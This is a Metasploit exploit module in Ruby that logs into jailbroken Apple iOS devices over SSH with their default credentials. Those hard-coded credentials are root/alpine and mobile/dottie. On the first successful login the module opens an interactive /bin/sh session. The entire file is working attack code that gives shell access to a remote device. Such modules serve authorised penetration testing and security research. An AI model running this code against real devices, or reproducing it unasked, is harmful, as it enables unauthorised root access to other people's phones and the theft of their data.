# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require &#039;msf/core&#039;
require &#039;net/ssh&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Auxiliary::CommandShell

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => "Apple iOS Default SSH Password Vulnerability",
      &#039;Description&#039;    => %q{
        This module exploits the default credentials of Apple iOS when it
        has been jailbroken and the passwords for the &#039;root&#039; and &#039;mobile&#039;
        users have not been changed.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;hdm&#039;
        ],
      &#039;References&#039;     =>
        [

        ],
      &#039;DefaultOptions&#039;  =>
        {
          &#039;ExitFunction&#039; => "none"
        },
      &#039;Payload&#039;        =>
        {
          &#039;Compat&#039; => {
            &#039;PayloadType&#039;    => &#039;cmd_interact&#039;,
            &#039;ConnectionType&#039; => &#039;find&#039;
          }
        },
      &#039;Platform&#039;       => &#039;unix&#039;,
      &#039;Arch&#039;           => ARCH_CMD,
      &#039;Targets&#039;        =>
        [
          [&#039;Apple iOS&#039;, { &#039;accounts&#039; => [ [ &#039;root&#039;, &#039;alpine&#039; ], [ &#039;mobile&#039;, &#039;dottie&#039; ]] } ],
        ],
      &#039;Privileged&#039;     => true,
      &#039;DefaultTarget&#039;  => 0))

    register_options(
      [
        Opt::RHOST(),
        Opt::RPORT(22)
      ], self.class
    )

    register_advanced_options(
      [
        OptBool.new(&#039;SSH_DEBUG&#039;, [ false, &#039;Enable SSH debugging output (Extreme verbosity!)&#039;, false]),
        OptInt.new(&#039;SSH_TIMEOUT&#039;, [ false, &#039;Specify the maximum time to negotiate a SSH session&#039;, 30])
      ]
    )
  end


  def rhost
    datastore[&#039;RHOST&#039;]
  end


  def rport
    datastore[&#039;RPORT&#039;]
  end


  def do_login(user, pass)
    opts = {
      :auth_methods => [&#039;password&#039;, &#039;keyboard-interactive&#039;],
      :msframework  => framework,
      :msfmodule    => self,
      :port         => rport,
      :disable_agent => true,
      :config => false,
      :password => pass,
      :record_auth_info => true,
      :proxies => datastore[&#039;Proxies&#039;]
    }

    opts.merge!(:verbose => :debug) if datastore[&#039;SSH_DEBUG&#039;]

    begin
      ssh = nil
      ::Timeout.timeout(datastore[&#039;SSH_TIMEOUT&#039;]) do
        ssh = Net::SSH.start(rhost, user, opts)
      end
    rescue Rex::ConnectionError, Rex::AddressInUse
      return
    rescue Net::SSH::Disconnect, ::EOFError
      print_error "#{rhost}:#{rport} SSH - Disconnected during negotiation"
      return
    rescue ::Timeout::Error
      print_error "#{rhost}:#{rport} SSH - Timed out during negotiation"
      return
    rescue Net::SSH::AuthenticationFailed
      print_error "#{rhost}:#{rport} SSH - Failed authentication"
    rescue Net::SSH::Exception => e
      print_error "#{rhost}:#{rport} SSH Error: #{e.class} : #{e.message}"
      return
    end

    if ssh
      conn = Net::SSH::CommandStream.new(ssh, &#039;/bin/sh&#039;, true)
      ssh = nil
      return conn
    end

    return nil
  end


  def exploit
    self.target[&#039;accounts&#039;].each do |info|
      user,pass = info
      print_status("#{rhost}:#{rport} - Attempt to login as &#039;#{user}&#039; with password &#039;#{pass}&#039;")
      conn = do_login(user, pass)
      if conn
        print_good("#{rhost}:#{rport} - Login Successful with &#039;#{user}:#{pass}&#039;")
        handler(conn.lsock)
        break
      end
    end
  end
end



